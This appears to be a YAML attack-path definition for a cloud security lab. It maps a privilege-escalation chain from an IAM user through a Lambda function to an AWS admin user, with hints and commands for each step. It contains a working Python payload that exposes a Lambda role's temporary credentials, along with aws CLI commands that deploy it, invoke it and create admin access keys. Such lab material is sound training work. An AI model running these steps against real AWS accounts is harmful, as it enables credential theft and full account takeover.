@@ -1,0 +1,108 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-004-to-iam-002-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has lambda:UpdateFunctionCode and lambda:InvokeFunction permissions
+        on the target Lambda function, enabling code injection and credential exfiltration.
+
+    - id: target-lambda
+      label: "Target Lambda"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function:pl-prod-lambda-004-to-iam-002-target-function"
+      description: >
+        This Lambda function can be modified by the starting user. When invoked,
+        it runs under the pl-prod-lambda-004-to-iam-002-lambda-role execution role,
+        which has iam:CreateAccessKey permission on the admin user. By replacing the
+        function code with a credential exfiltration payload and invoking it, you
+        capture the execution role's temporary credentials.
+
+    - id: lambda-role
+      label: "Lambda Execution Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-004-to-iam-002-lambda-role"
+      description: >
+        This is the IAM execution role assigned to the target Lambda function. After
+        exfiltrating its temporary credentials from the function invocation response,
+        you now operate as this role. It has iam:CreateAccessKey permission on the
+        admin user, which is the second hop in this escalation chain.
+
+    - id: target-admin
+      label: "Admin User"
+      type: principal
+      subType: iam-user
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-004-to-iam-002-admin-user"
+      description: >
+        This IAM user has AdministratorAccess. By using the Lambda execution role
+        credentials to call iam:CreateAccessKey on this user, you generate a permanent
+        access key pair granting full administrative control over the AWS account.
+
+  edges:
+    - from: starting-principal
+      to: target-lambda
+      label: "lambda:UpdateFunctionCode"
+      description: >
+        Replace the Lambda function's code with a credential exfiltration payload
+        that reads the execution role's environment variables and returns them in
+        the function response.
+      hints:
+        - "You can modify the code of Lambda functions."
+        - "Lambda functions run with an IAM execution role — what credentials might they expose?"
+        - "Update the function code to return the execution role credentials, then invoke it."
+        - "Browse to https://pathfinding.cloud/paths/lambda-004 for technique details."
+      commands:
+        - description: "Create the malicious Lambda payload"
+          command: |
+            cat > /tmp/lambda_payload.py << 'EOF'
+            import os, json
+            def lambda_handler(event, context):
+                return {'statusCode': 200, 'body': json.dumps({'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'), 'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'), 'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN')})}
+            EOF
+            cd /tmp && zip lambda_payload.zip lambda_payload.py
+        - description: "Update the Lambda function code"
+          command: "aws lambda update-function-code --function-name pl-prod-lambda-004-to-iam-002-target-function --zip-file fileb:///tmp/lambda_payload.zip"
+
+    - from: target-lambda
+      to: lambda-role
+      label: "lambda:InvokeFunction"
+      description: >
+        Invoke the modified Lambda function to execute the credential exfiltration
+        payload. The response body contains the execution role's temporary AWS
+        credentials (access key ID, secret access key, and session token).
+      hints:
+        - "What IAM role does this Lambda function execute under?"
+        - "Lambda functions receive execution role credentials as environment variables."
+        - "Replace the handler with code that returns AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN."
+      commands:
+        - description: "Invoke the function and capture credentials"
+          command: "aws lambda invoke --function-name pl-prod-lambda-004-to-iam-002-target-function --payload '{}' /tmp/response.json && cat /tmp/response.json | jq -r '.body' | jq '.'"
+
+    - from: lambda-role
+      to: target-admin
+      label: "iam:CreateAccessKey"
+      description: >
+        Using the exfiltrated Lambda execution role credentials, create a permanent
+        access key pair for the admin user. This grants full AdministratorAccess
+        to the AWS account.
+      hints:
+        - "This role has IAM permissions. What can it do to IAM users?"
+        - "Look for iam:CreateAccessKey in the role's attached policies."
+        - "Browse to https://pathfinding.cloud/paths/iam-002 for technique details."
+      commands:
+        - description: "Create access keys for the admin user"
+          command: "aws iam create-access-key --user-name pl-prod-lambda-004-to-iam-002-admin-user"
+        - description: "Verify admin access"
+          command: "aws iam list-users"
